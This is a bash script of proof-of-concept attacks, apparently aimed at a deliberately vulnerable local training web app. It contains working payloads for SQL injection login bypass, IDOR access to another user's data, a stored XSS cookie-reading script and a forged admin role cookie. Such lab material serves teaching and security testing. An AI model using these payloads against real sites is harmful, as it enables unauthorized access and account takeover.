#!/usr/bin/env bash
# PoCs against the VULNERABLE app (localhost:5000 only).
# Start it first:  python app_vulnerable.py
B=http://127.0.0.1:5000
J=$(mktemp -d)
strip() { sed -e 's/<[^>]*>/ /g' | tr -s ' \n' | head -c 400; echo; }

echo "=== 1. SQL injection: log in as admin without the password ==="
curl -s -c $J/admin.jar -o /dev/null -w "login status: %{http_code}\n" \
  --data-urlencode "username=admin'--" --data-urlencode "password=anything" $B/login
curl -s -b $J/admin.jar $B/ | strip

echo; echo "=== 2. IDOR: alice reads bob's profile and registration ==="
curl -s -c $J/alice.jar -o /dev/null -d "username=alice&password=alice123" $B/login
curl -s -b $J/alice.jar $B/profile/2 | strip
curl -s -b $J/alice.jar $B/registrations/2 | strip

echo; echo "=== 3. Stored XSS: alice plants a script in her note ==="
curl -s -b $J/alice.jar -o /dev/null \
  --data-urlencode "note=<script>alert(document.cookie)</script>" $B/events/1/register
echo "raw response contains:"
curl -s -b $J/alice.jar $B/events | grep -o "<script>[^<]*</script>"

echo; echo "=== 4. Forged role cookie: no login at all, just a cookie ==="
curl -s -H "Cookie: role=admin" $B/admin | strip
